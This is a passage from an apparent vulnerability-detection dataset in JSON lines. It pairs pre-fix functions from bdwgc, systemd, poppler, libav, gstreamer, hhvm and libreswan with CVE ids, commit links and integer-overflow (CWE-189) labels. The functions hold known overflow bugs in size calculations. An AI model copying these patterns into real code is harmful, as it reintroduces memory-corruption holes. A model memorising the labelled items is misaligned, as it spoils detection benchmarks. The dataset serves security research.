"https://nvd.nist.gov/vuln/detail/CVE-2012-2673"}
{"idx": 10644, "project": "bdwgc", "commit_id": "83231d0ab5ed60015797c3d1ad9056295ac3b2bb", "project_url": "https://github.com/ivmai/bdwgc", "commit_url": "https://github.com/ivmai/bdwgc/commit/83231d0ab5ed60015797c3d1ad9056295ac3b2bb", "commit_message": "Speedup calloc size overflow check by preventing division if small values\n\n* malloc.c (GC_SQRT_SIZE_MAX): New macro.\n* malloc.c (calloc): Add fast initial size overflow check to avoid\ninteger division for reasonably small values passed.", "target": 1, "func": " void * calloc(size_t n, size_t lb)\n {\n    if (lb && n > GC_SIZE_MAX / lb)\n       return NULL;\n #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */\n         /* libpthread allocated some memory that is only pointed to by  */\n        /* mmapped thread stacks.  Make sure it's not collectable.      */\n        {\n          static GC_bool lib_bounds_set = FALSE;\n          ptr_t caller = (ptr_t)__builtin_return_address(0);\n          /* This test does not need to ensure memory visibility, since */\n          /* the bounds will be set when/if we create another thread.   */\n          if (!EXPECT(lib_bounds_set, TRUE)) {\n            GC_init_lib_bounds();\n            lib_bounds_set = TRUE;\n          }\n          if (((word)caller >= (word)GC_libpthread_start\n               && (word)caller < (word)GC_libpthread_end)\n              || ((word)caller >= (word)GC_libld_start\n                  && (word)caller < (word)GC_libld_end))\n            return GC_malloc_uncollectable(n*lb);\n          /* The two ranges are actually usually adjacent, so there may */\n          /* be a way to speed this up.                                 */\n        }\n#   endif\n    return((void *)REDIRECT_MALLOC(n*lb));\n}\n", "func_hash": 286136948008637883570400561604207145027, "file_name": "malloc.c", "file_hash": 209968943630946822594813454907696544192, "cwe": ["CWE-189"], "cve": "CVE-2012-2673", "cve_desc": "Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2673"}
{"idx": 10692, "project": "systemd", "commit_id": "505b6a61c22d5565e9308045c7b9bf79f7d0517e", "project_url": "https://github.com/systemd/systemd", "commit_url": "https://cgit.freedesktop.org/systemd/systemd/commit/?id=505b6a61c22d5565e9308045c7b9bf79f7d0517e", "commit_message": "journald: don't accept arbitrarily sized journal data fields\n\nhttps://bugzilla.redhat.com/show_bug.cgi?id=858746", "target": 1, "func": "void server_process_native_message(\n                Server *s,\n                const void *buffer, size_t buffer_size,\n                struct ucred *ucred,\n                struct timeval *tv,\n                const char *label, size_t label_len) {\n\n        struct iovec *iovec = NULL;\n        unsigned n = 0, m = 0, j, tn = (unsigned) -1;\n        const char *p;\n        size_t remaining;\n        int priority = LOG_INFO;\n        char *identifier = NULL, *message = NULL;\n\n        assert(s);\n        assert(buffer || buffer_size == 0);\n\n        p = buffer;\n        remaining = buffer_size;\n\n        while (remaining > 0) {\n                const char *e, *q;\n\n                e = memchr(p, '\\n', remaining);\n\n                if (!e) {\n                        /* Trailing noise, let's ignore it, and flush what we collected */\n                        log_debug(\"Received message with trailing noise, ignoring.\");\n                        break;\n                }\n\n                if (e == p) {\n                        /* Entry separator */\n                        server_dispatch_message(s, iovec, n, m, ucred, tv, label, label_len, NULL, priority);\n                        n = 0;\n                        priority = LOG_INFO;\n\n                        p++;\n                        remaining--;\n                        continue;\n                }\n\n                if (*p == '.' || *p == '#') {\n                        /* Ignore control commands for now, and\n                         * comments too. */\n                        remaining -= (e - p) + 1;\n                        p = e + 1;\n                        continue;\n                }\n\n                /* A property follows */\n\n                if (n+N_IOVEC_META_FIELDS >= m) {\n                        struct iovec *c;\n                        unsigned u;\n\n                        u = MAX((n+N_IOVEC_META_FIELDS+1) * 2U, 4U);\n                        c = realloc(iovec, u * sizeof(struct iovec));\n                        if (!c) {\n                                log_oom();\n                                break;\n                        }\n\n                        iovec = c;\n                        m = u;\n                }\n\n                q = memchr(p, '=', e - p);\n                if (q) {\n                        if (valid_user_field(p, q - p)) {\n                                size_t l;\n\n                                l = e - p;\n\n                                /* If the field name starts with an\n                                 * underscore, skip the variable,\n                                 * since that indidates a trusted\n                                 * field */\n                                iovec[n].iov_base = (char*) p;\n                                iovec[n].iov_len = l;\n                                n++;\n\n                                /* We need to determine the priority\n                                 * of this entry for the rate limiting\n                                 * logic */\n                                if (l == 10 &&\n                                    memcmp(p, \"PRIORITY=\", 9) == 0 &&\n                                    p[9] >= '0' && p[9] <= '9')\n                                        priority = (priority & LOG_FACMASK) | (p[9] - '0');\n\n                                else if (l == 17 &&\n                                         memcmp(p, \"SYSLOG_FACILITY=\", 16) == 0 &&\n                                         p[16] >= '0' && p[16] <= '9')\n                                        priority = (priority & LOG_PRIMASK) | ((p[16] - '0') << 3);\n\n                                else if (l == 18 &&\n                                         memcmp(p, \"SYSLOG_FACILITY=\", 16) == 0 &&\n                                         p[16] >= '0' && p[16] <= '9' &&\n                                         p[17] >= '0' && p[17] <= '9')\n                                        priority = (priority & LOG_PRIMASK) | (((p[16] - '0')*10 + (p[17] - '0')) << 3);\n\n                                else if (l >= 19 &&\n                                         memcmp(p, \"SYSLOG_IDENTIFIER=\", 18) == 0) {\n                                        char *t;\n\n                                        t = strndup(p + 18, l - 18);\n                                        if (t) {\n                                                free(identifier);\n                                                identifier = t;\n                                        }\n                                } else if (l >= 8 &&\n                                           memcmp(p, \"MESSAGE=\", 8) == 0) {\n                                        char *t;\n\n                                        t = strndup(p + 8, l - 8);\n                                        if (t) {\n                                                free(message);\n                                                message = t;\n                                        }\n                                }\n                        }\n\n                        remaining -= (e - p) + 1;\n                        p = e + 1;\n                        continue;\n                } else {\n                        le64_t l_le;\n                        uint64_t l;\n                        char *k;\n\n                        if (remaining < e - p + 1 + sizeof(uint64_t) + 1) {\n                                log_debug(\"Failed to parse message, ignoring.\");\n                                break;\n                        }\n\n                        memcpy(&l_le, e + 1, sizeof(uint64_t));\n                        l = le64toh(l_le);\n\n                        if (remaining < e - p + 1 + sizeof(uint64_t) + l + 1 ||\n                            e[1+sizeof(uint64_t)+l] != '\\n') {\n                                log_debug(\"Failed to parse message, ignoring.\");\n                                break;\n                        }\n\n                        k = malloc((e - p) + 1 + l);\n                        if (!k) {\n                                log_oom();\n                                break;\n                        }\n\n                        memcpy(k, p, e - p);\n                        k[e - p] = '=';\n                        memcpy(k + (e - p) + 1, e + 1 + sizeof(uint64_t), l);\n\n                        if (valid_user_field(p, e - p)) {\n                                iovec[n].iov_base = k;\n                                iovec[n].iov_len = (e - p) + 1 + l;\n                                n++;\n                        } else\n                                free(k);\n\n                        remaining -= (e - p) + 1 + sizeof(uint64_t) + l + 1;\n                        p = e + 1 + sizeof(uint64_t) + l + 1;\n                }\n        }\n\n        if (n <= 0)\n                goto finish;\n\n        tn = n++;\n        IOVEC_SET_STRING(iovec[tn], \"_TRANSPORT=journal\");\n\n        if (message) {\n                if (s->forward_to_syslog)\n                        server_forward_syslog(s, priority, identifier, message, ucred, tv);\n\n                if (s->forward_to_kmsg)\n                        server_forward_kmsg(s, priority, identifier, message, ucred);\n\n                if (s->forward_to_console)\n                        server_forward_console(s, priority, identifier, message, ucred);\n        }\n\n        server_dispatch_message(s, iovec, n, m, ucred, tv, label, label_len, NULL, priority);\n\nfinish:\n        for (j = 0; j < n; j++)  {\n                if (j == tn)\n                        continue;\n\n                if (iovec[j].iov_base < buffer ||\n                    (const uint8_t*) iovec[j].iov_base >= (const uint8_t*) buffer + buffer_size)\n                        free(iovec[j].iov_base);\n        }\n\n        free(iovec);\n        free(identifier);\n        free(message);\n}", "func_hash": 206165572902001341820075512674135605797, "file_name": "journald-native.c", "file_hash": 120038332300868230552758816125523948481, "cwe": ["CWE-189"], "cve": "CVE-2013-4391", "cve_desc": "Integer overflow in the valid_user_field function in journal/journald-native.c in systemd allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large journal data field, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4391"}
{"idx": 10734, "project": "poppler", "commit_id": "9cf2325fb22f812b31858e519411f57747d39bd8", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb22f812b31858e519411f57747d39bd8", "commit_message": "More gmalloc  gmallocn", "target": 1, "func": "SplashBitmap::SplashBitmap(int widthA, int heightA, int rowPad,\n\t\t\t   SplashColorMode modeA, GBool alphaA,\n\t\t\t   GBool topDown) {\n  width = widthA;\n  height = heightA;\n  mode = modeA;\n  switch (mode) {\n  case splashModeMono1:\n    rowSize = (width + 7) >> 3;\n    break;\n  case splashModeMono8:\n    rowSize = width;\n    break;\n  case splashModeRGB8:\n  case splashModeBGR8:\n    rowSize = width * 3;\n    break;\n  case splashModeXBGR8:\n    rowSize = width * 4;\n    break;\n#if SPLASH_CMYK\n  case splashModeCMYK8:\n    rowSize = width * 4;\n    break;\n#endif\n  }\n  rowSize += rowPad - 1;\n  rowSize -= rowSize % rowPad;\n  data = (SplashColorPtr)gmalloc(rowSize * height);\n  if (!topDown) {\n    data += (height - 1) * rowSize;\n    rowSize = -rowSize;\n  }\n  if (alphaA) {\n    alpha = (Guchar *)gmalloc(width * height);\n  } else {\n    alpha = NULL;\n  }\n}", "func_hash": 291686055334142585352002241454564713585, "file_name": "SplashBitmap.cc", "file_hash": 211881515219105395391955156762432223239, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 10735, "project": "poppler", "commit_id": "9cf2325fb22f812b31858e519411f57747d39bd8", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb22f812b31858e519411f57747d39bd8", "commit_message": "More gmalloc  gmallocn", "target": 1, "func": "GBool SplashFTFont::makeGlyph(int c, int xFrac, int yFrac,\n\t\t\t      SplashGlyphBitmap *bitmap, int x0, int y0, SplashClip *clip, SplashClipResult *clipRes) {\n  SplashFTFontFile *ff;\n  FT_Vector offset;\n  FT_GlyphSlot slot;\n  FT_UInt gid;\n  int rowSize;\n  Guchar *p, *q;\n  int i;\n\n  ff = (SplashFTFontFile *)fontFile;\n\n  ff->face->size = sizeObj;\n  offset.x = (FT_Pos)(int)((SplashCoord)xFrac * splashFontFractionMul * 64);\n  offset.y = 0;\n  FT_Set_Transform(ff->face, &matrix, &offset);\n  slot = ff->face->glyph;\n\n  if (ff->codeToGID && c < ff->codeToGIDLen) {\n    gid = (FT_UInt)ff->codeToGID[c];\n  } else {\n    gid = (FT_UInt)c;\n  }\n  if (ff->trueType && gid == 0) {\n    // skip the TrueType notdef glyph\n    return gFalse;\n  }\n\n  // if we have the FT2 bytecode interpreter, autohinting won't be used\n#ifdef TT_CONFIG_OPTION_BYTECODE_INTERPRETER\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_BITMAP : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#else\n  // FT2's autohinting doesn't always work very well (especially with\n  // font subsets), so turn it off if anti-aliasing is enabled; if\n  // anti-aliasing is disabled, this seems to be a tossup - some fonts\n  // look better with hinting, some without, so leave hinting on\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_HINTING | FT_LOAD_NO_BITMAP\n                       : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#endif\n\n  FT_Glyph_Metrics *glyphMetrics = &(ff->face->glyph->metrics);\n  // prelimirary values from FT_Glyph_Metrics\n  bitmap->x = splashRound(-glyphMetrics->horiBearingX / 64.0);\n  bitmap->y = splashRound(glyphMetrics->horiBearingY / 64.0);\n  bitmap->w = splashRound(glyphMetrics->width / 64.0);\n  bitmap->h = splashRound(glyphMetrics->height / 64.0);\n\n  *clipRes = clip->testRect(x0 - bitmap->x,\n                            y0 - bitmap->y,\n                            x0 - bitmap->x + bitmap->w,\n                            y0 - bitmap->y + bitmap->h);\n  if (*clipRes == splashClipAllOutside) {\n    bitmap->freeData = gFalse;\n    return gTrue;\n  }\n\n  if (FT_Render_Glyph(slot, aa ? ft_render_mode_normal\n\t\t               : ft_render_mode_mono)) {\n    return gFalse;\n  }\n\n  bitmap->x = -slot->bitmap_left;\n  bitmap->y = slot->bitmap_top;\n  bitmap->w = slot->bitmap.width;\n  bitmap->h = slot->bitmap.rows;\n  bitmap->aa = aa;\n  if (aa) {\n    rowSize = bitmap->w;\n  } else {\n    rowSize = (bitmap->w + 7) >> 3;\n  }\n  bitmap->data = (Guchar *)gmalloc(rowSize * bitmap->h);\n  bitmap->freeData = gTrue;\n  for (i = 0, p = bitmap->data, q = slot->bitmap.buffer;\n       i < bitmap->h;\n       ++i, p += rowSize, q += slot->bitmap.pitch) {\n    memcpy(p, q, rowSize);\n  }\n\n  return gTrue;\n}", "func_hash": 320507127576760393617432982959447579733, "file_name": "SplashFTFont.cc", "file_hash": 137915116313860128540713108974559813270, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 10742, "project": "libav", "commit_id": "0a49a62f998747cfa564d98d36a459fe70d3299b", "project_url": "https://github.com/libav/libav", "commit_url": "https://git.libav.org/?p=libav.git;a=commitdiff;h=0a49a62f998747cfa564d98d36a459fe70d3299b", "commit_message": "h263: Always check both dimensions\n\nCC: libav-stable@libav.org\nFound-By: ago@gentoo.org", "target": 1, "func": "int ff_h263_decode_picture_header(MpegEncContext *s)\n{\n    int format, width, height, i;\n    uint32_t startcode;\n\n    align_get_bits(&s->gb);\n\n    startcode= get_bits(&s->gb, 22-8);\n\n    for(i= get_bits_left(&s->gb); i>24; i-=8) {\n        startcode = ((startcode << 8) | get_bits(&s->gb, 8)) & 0x003FFFFF;\n\n        if(startcode == 0x20)\n            break;\n    }\n\n    if (startcode != 0x20) {\n        av_log(s->avctx, AV_LOG_ERROR, \"Bad picture start code\\n\");\n        return -1;\n    }\n    /* temporal reference */\n    i = get_bits(&s->gb, 8); /* picture timestamp */\n    if( (s->picture_number&~0xFF)+i < s->picture_number)\n        i+= 256;\n    s->picture_number= (s->picture_number&~0xFF) + i;\n\n    /* PTYPE starts here */\n    if (get_bits1(&s->gb) != 1) {\n        /* marker */\n        av_log(s->avctx, AV_LOG_ERROR, \"Bad marker\\n\");\n        return -1;\n    }\n    if (get_bits1(&s->gb) != 0) {\n        av_log(s->avctx, AV_LOG_ERROR, \"Bad H263 id\\n\");\n        return -1;      /* h263 id */\n    }\n    skip_bits1(&s->gb);         /* split screen off */\n    skip_bits1(&s->gb);         /* camera  off */\n    skip_bits1(&s->gb);         /* freeze picture release off */\n\n    format = get_bits(&s->gb, 3);\n    /*\n        0    forbidden\n        1    sub-QCIF\n        10   QCIF\n        7       extended PTYPE (PLUSPTYPE)\n    */\n\n    if (format != 7 && format != 6) {\n        s->h263_plus = 0;\n        /* H.263v1 */\n        width = ff_h263_format[format][0];\n        height = ff_h263_format[format][1];\n        if (!width)\n            return -1;\n\n        s->pict_type = AV_PICTURE_TYPE_I + get_bits1(&s->gb);\n\n        s->h263_long_vectors = get_bits1(&s->gb);\n\n        if (get_bits1(&s->gb) != 0) {\n            av_log(s->avctx, AV_LOG_ERROR, \"H263 SAC not supported\\n\");\n            return -1; /* SAC: off */\n        }\n        s->obmc= get_bits1(&s->gb); /* Advanced prediction mode */\n        s->unrestricted_mv = s->h263_long_vectors || s->obmc;\n\n        s->pb_frame = get_bits1(&s->gb);\n        s->chroma_qscale= s->qscale = get_bits(&s->gb, 5);\n        skip_bits1(&s->gb); /* Continuous Presence Multipoint mode: off */\n\n        s->width = width;\n        s->height = height;\n        s->avctx->sample_aspect_ratio= (AVRational){12,11};\n        s->avctx->framerate = (AVRational){ 30000, 1001 };\n    } else {\n        int ufep;\n\n        /* H.263v2 */\n        s->h263_plus = 1;\n        ufep = get_bits(&s->gb, 3); /* Update Full Extended PTYPE */\n\n        /* ufep other than 0 and 1 are reserved */\n        if (ufep == 1) {\n            /* OPPTYPE */\n            format = get_bits(&s->gb, 3);\n            ff_dlog(s->avctx, \"ufep=1, format: %d\\n\", format);\n            s->custom_pcf= get_bits1(&s->gb);\n            s->umvplus = get_bits1(&s->gb); /* Unrestricted Motion Vector */\n            if (get_bits1(&s->gb) != 0) {\n                av_log(s->avctx, AV_LOG_ERROR, \"Syntax-based Arithmetic Coding (SAC) not supported\\n\");\n            }\n            s->obmc= get_bits1(&s->gb); /* Advanced prediction mode */\n            s->h263_aic = get_bits1(&s->gb); /* Advanced Intra Coding (AIC) */\n            s->loop_filter= get_bits1(&s->gb);\n            s->unrestricted_mv = s->umvplus || s->obmc || s->loop_filter;\n\n            s->h263_slice_structured= get_bits1(&s->gb);\n            if (get_bits1(&s->gb) != 0) {\n                av_log(s->avctx, AV_LOG_ERROR, \"Reference Picture Selection not supported\\n\");\n            }\n            if (get_bits1(&s->gb) != 0) {\n                av_log(s->avctx, AV_LOG_ERROR, \"Independent Segment Decoding not supported\\n\");\n            }\n            s->alt_inter_vlc= get_bits1(&s->gb);\n            s->modified_quant= get_bits1(&s->gb);\n            if(s->modified_quant)\n                s->chroma_qscale_table= ff_h263_chroma_qscale_table;\n\n            skip_bits(&s->gb, 1); /* Prevent start code emulation */\n\n            skip_bits(&s->gb, 3); /* Reserved */\n        } else if (ufep != 0) {\n            av_log(s->avctx, AV_LOG_ERROR, \"Bad UFEP type (%d)\\n\", ufep);\n            return -1;\n        }\n\n        /* MPPTYPE */\n        s->pict_type = get_bits(&s->gb, 3);\n        switch(s->pict_type){\n        case 0: s->pict_type= AV_PICTURE_TYPE_I;break;\n        case 1: s->pict_type= AV_PICTURE_TYPE_P;break;\n        case 2: s->pict_type= AV_PICTURE_TYPE_P;s->pb_frame = 3;break;\n        case 3: s->pict_type= AV_PICTURE_TYPE_B;break;\n        case 7: s->pict_type= AV_PICTURE_TYPE_I;break; //ZYGO\n        default:\n            return -1;\n        }\n        skip_bits(&s->gb, 2);\n        s->no_rounding = get_bits1(&s->gb);\n        skip_bits(&s->gb, 4);\n\n        /* Get the picture dimensions */\n        if (ufep) {\n            if (format == 6) {\n                /* Custom Picture Format (CPFMT) */\n                s->aspect_ratio_info = get_bits(&s->gb, 4);\n                ff_dlog(s->avctx, \"aspect: %d\\n\", s->aspect_ratio_info);\n                /* aspect ratios:\n                0 - forbidden\n                1 - 1:1\n                2 - 12:11 (CIF 4:3)\n                3 - 10:11 (525-type 4:3)\n                4 - 16:11 (CIF 16:9)\n                5 - 40:33 (525-type 16:9)\n                6-14 - reserved\n                */\n                width = (get_bits(&s->gb, 9) + 1) * 4;\n                skip_bits1(&s->gb);\n                height = get_bits(&s->gb, 9) * 4;\n                ff_dlog(s->avctx, \"\\nH.263+ Custom picture: %dx%d\\n\",width,height);\n                if (s->aspect_ratio_info == FF_ASPECT_EXTENDED) {\n                    /* aspected dimensions */\n                    s->avctx->sample_aspect_ratio.num= get_bits(&s->gb, 8);\n                    s->avctx->sample_aspect_ratio.den= get_bits(&s->gb, 8);\n                }else{\n                    s->avctx->sample_aspect_ratio= ff_h263_pixel_aspect[s->aspect_ratio_info];\n                }\n            } else {\n                width = ff_h263_format[format][0];\n                height = ff_h263_format[format][1];\n                s->avctx->sample_aspect_ratio= (AVRational){12,11};\n            }\n            if ((width == 0) || (height == 0))\n                return -1;\n            s->width = width;\n            s->height = height;\n\n            if(s->custom_pcf){\n                int gcd;\n                s->avctx->framerate.num  = 1800000;\n                s->avctx->framerate.den  = 1000 + get_bits1(&s->gb);\n                s->avctx->framerate.den *= get_bits(&s->gb, 7);\n                if(s->avctx->framerate.den == 0){\n                    av_log(s, AV_LOG_ERROR, \"zero framerate\\n\");\n                    return -1;\n                }\n                gcd= av_gcd(s->avctx->framerate.den, s->avctx->framerate.num);\n                s->avctx->framerate.den /= gcd;\n                s->avctx->framerate.num /= gcd;\n            }else{\n                s->avctx->framerate = (AVRational){ 30000, 1001 };\n            }\n        }\n\n        if(s->custom_pcf){\n            skip_bits(&s->gb, 2); //extended Temporal reference\n        }\n\n        if (ufep) {\n            if (s->umvplus) {\n                if(get_bits1(&s->gb)==0) /* Unlimited Unrestricted Motion Vectors Indicator (UUI) */\n                    skip_bits1(&s->gb);\n            }\n            if(s->h263_slice_structured){\n                if (get_bits1(&s->gb) != 0) {\n                    av_log(s->avctx, AV_LOG_ERROR, \"rectangular slices not supported\\n\");\n                }\n                if (get_bits1(&s->gb) != 0) {\n                    av_log(s->avctx, AV_LOG_ERROR, \"unordered slices not supported\\n\");\n                }\n            }\n        }\n\n        s->qscale = get_bits(&s->gb, 5);\n    }\n\n    s->mb_width = (s->width  + 15) / 16;\n    s->mb_height = (s->height  + 15) / 16;\n    s->mb_num = s->mb_width * s->mb_height;\n\n    if (s->pb_frame) {\n        skip_bits(&s->gb, 3); /* Temporal reference for B-pictures */\n        if (s->custom_pcf)\n            skip_bits(&s->gb, 2); //extended Temporal reference\n        skip_bits(&s->gb, 2); /* Quantization information for B-pictures */\n    }\n\n    if (s->pict_type!=AV_PICTURE_TYPE_B) {\n        s->time            = s->picture_number;\n        s->pp_time         = s->time - s->last_non_b_time;\n        s->last_non_b_time = s->time;\n    }else{\n        s->time    = s->picture_number;\n        s->pb_time = s->pp_time - (s->last_non_b_time - s->time);\n        if (s->pp_time <=s->pb_time ||\n            s->pp_time <= s->pp_time - s->pb_time ||\n            s->pp_time <= 0){\n            s->pp_time = 2;\n            s->pb_time = 1;\n        }\n        ff_mpeg4_init_direct_mv(s);\n    }\n\n    /* PEI */\n    while (get_bits1(&s->gb) != 0) {\n        skip_bits(&s->gb, 8);\n    }\n\n    if(s->h263_slice_structured){\n        if (get_bits1(&s->gb) != 1) {\n            av_log(s->avctx, AV_LOG_ERROR, \"SEPB1 marker missing\\n\");\n            return -1;\n        }\n\n        ff_h263_decode_mba(s);\n\n        if (get_bits1(&s->gb) != 1) {\n            av_log(s->avctx, AV_LOG_ERROR, \"SEPB2 marker missing\\n\");\n            return -1;\n        }\n    }\n    s->f_code = 1;\n\n    if(s->h263_aic){\n         s->y_dc_scale_table=\n         s->c_dc_scale_table= ff_aic_dc_scale_table;\n    }else{\n        s->y_dc_scale_table=\n        s->c_dc_scale_table= ff_mpeg1_dc_scale_table;\n    }\n\n        ff_h263_show_pict_info(s);\n    if (s->pict_type == AV_PICTURE_TYPE_I && s->codec_tag == AV_RL32(\"ZYGO\")){\n        int i,j;\n        for(i=0; i<85; i++) av_log(s->avctx, AV_LOG_DEBUG, \"%d\", get_bits1(&s->gb));\n        av_log(s->avctx, AV_LOG_DEBUG, \"\\n\");\n        for(i=0; i<13; i++){\n            for(j=0; j<3; j++){\n                int v= get_bits(&s->gb, 8);\n                v |= get_sbits(&s->gb, 8)<<8;\n                av_log(s->avctx, AV_LOG_DEBUG, \" %5d\", v);\n            }\n            av_log(s->avctx, AV_LOG_DEBUG, \"\\n\");\n        }\n        for(i=0; i<50; i++) av_log(s->avctx, AV_LOG_DEBUG, \"%d\", get_bits1(&s->gb));\n    }\n\n    return 0;\n}", "func_hash": 197626158404532314510739945572144125657, "file_name": "ituh263dec.c", "file_hash": 237581302495996998158734389910056269181, "cwe": ["CWE-189"], "cve": "CVE-2015-5479", "cve_desc": "The ff_h263_decode_mba function in libavcodec/ituh263dec.c in Libav before 11.5 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a file with crafted dimensions.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-5479"}
{"idx": 10792, "project": "gstreamer", "commit_id": "566583e87147f774e7fc4c78b5f7e61d427e40a9", "project_url": "https://github.com/GStreamer/gstreamer", "commit_url": "https://cgit.freedesktop.org/gstreamer/gst-plugins-base/commit/?id=566583e87147f774e7fc4c78b5f7e61d427e40a9", "commit_message": "vorbistag: Protect memory allocation calculation from overflow.\n\nPatch by: Tomas Hoger <thoger@redhat.com> Fixes CVE-2009-0586", "target": 1, "func": "gst_vorbis_tag_add_coverart (GstTagList * tags, const gchar * img_data_base64,\n    gint base64_len)\n{\n  GstBuffer *img;\n  guchar *img_data;\n  gsize img_len;\n  guint save = 0;\n  gint state = 0;\n\n  if (base64_len < 2)\n    goto not_enough_data;\n\n  img_data = g_try_malloc0 (base64_len * 3 / 4);\n\n  if (img_data == NULL)\n    goto alloc_failed;\n\n  img_len = g_base64_decode_step (img_data_base64, base64_len, img_data,\n      &state, &save);\n\n  if (img_len == 0)\n    goto decode_failed;\n\n  img = gst_tag_image_data_to_image_buffer (img_data, img_len,\n      GST_TAG_IMAGE_TYPE_NONE);\n\n  if (img == NULL)\n    goto convert_failed;\n\n  gst_tag_list_add (tags, GST_TAG_MERGE_APPEND,\n      GST_TAG_PREVIEW_IMAGE, img, NULL);\n\n  gst_buffer_unref (img);\n  g_free (img_data);\n  return;\n\n/* ERRORS */\nnot_enough_data:\n  {\n    GST_WARNING (\"COVERART tag with too little base64-encoded data\");\n    return;\n  }\nalloc_failed:\n  {\n    GST_WARNING (\"Couldn't allocate enough memory to decode COVERART tag\");\n    return;\n  }\ndecode_failed:\n  {\n    GST_WARNING (\"Couldn't decode bas64 image data from COVERART tag\");\n    g_free (img_data);\n    return;\n  }\nconvert_failed:\n  {\n    GST_WARNING (\"Couldn't extract image or image type from COVERART tag\");\n    g_free (img_data);\n    return;\n  }\n}", "func_hash": 146313219496584415472503042812316046333, "file_name": "gstvorbistag.c", "file_hash": 211094231011375403869463571721385707024, "cwe": ["CWE-189"], "cve": "CVE-2009-0586", "cve_desc": "Integer overflow in the gst_vorbis_tag_add_coverart function (gst-libs/gst/tag/gstvorbistag.c) in vorbistag in gst-plugins-base (aka gstreamer-plugins-base) before 0.10.23 in GStreamer allows context-dependent attackers to execute arbitrary code via a crafted COVERART tag that is converted from a base64 representation, which triggers a heap-based buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0586"}
{"idx": 195474, "project": "hhvm", "commit_id": "1f91e076a585118495b976a413c1df40f6fd3d41", "project_url": "https://github.com/facebook/hhvm", "commit_url": "https://github.com/facebook/hhvm/commit/1f91e076a585118495b976a413c1df40f6fd3d41", "commit_message": "Fix integer overflow in chunk_split\n\nReviewed By: @ptarjan\n\nDifferential Revision: D1515947", "target": 1, "func": "String string_chunk_split(const char *src, int srclen, const char *end,\n                          int endlen, int chunklen) {\n  int chunks = srclen / chunklen; // complete chunks!\n  int restlen = srclen - chunks * chunklen; /* srclen % chunklen */\n\n  int out_len = (chunks + 1) * endlen + srclen;\n  String ret(out_len, ReserveString);\n  char *dest = ret.bufferSlice().ptr;\n\n  const char *p; char *q;\n  const char *pMax = src + srclen - chunklen + 1;\n  for (p = src, q = dest; p < pMax; ) {\n    memcpy(q, p, chunklen);\n    q += chunklen;\n    memcpy(q, end, endlen);\n    q += endlen;\n    p += chunklen;\n  }\n\n  if (restlen) {\n    memcpy(q, p, restlen);\n    q += restlen;\n    memcpy(q, end, endlen);\n    q += endlen;\n  }\n\n  ret.setSize(q - dest);\n  return ret;\n}", "func_hash": 41070013776066671948622759894272386817, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-6228", "cve_desc": "Integer overflow in the string_chunk_split function in hphp/runtime/base/zend-string.cpp in Facebook HipHop Virtual Machine (HHVM) before 3.3.0 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted arguments to the chunk_split function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6228"}
{"idx": 200568, "project": "libreswan", "commit_id": "9b31deafbdbf0c2206358dfbf2d4e343e365f23f", "project_url": "https://github.com/libreswan/libreswan", "commit_url": "https://github.com/libreswan/libreswan/commit/9b31deafbdbf0c2206358dfbf2d4e343e365f23f", "commit_message": "SECURITY: Do not inspect or continue on very short packets\n\nCode introduced in Openswan to ensure the IKEv2 minor was ignored\nintroduced a vulnerability that caused mangled short IKE packets to\nbe processed as valid IKE packets despite in_struct() returning a\nfailure, resulting in pluto crashing and restarting.\n\nReported by Nick Howitt.\n\nAdditionally, with the introduction of IKEv2, incoming packets always\nassumed it could at least read the IKE Major version number, and would\ncrash when the packet was overly short and did not contain such a number\n\nThis patch ensures the code not attempt to read the IKE version and might cause an\nIKEv1 packet to be sent as response to a badly mangled IKEv2 packet, as\nwe default to IKEv1 for this type of error. It also no longer skips aborting\na failed in_struct() read.\n\nIt turns the version number in a loose enum.\n\nSigned-off-by: Paul Wouters <pwouters@redhat.com>", "target": 1, "func": "void process_packet(struct msg_digest **mdp)\n{\n\tstruct msg_digest *md = 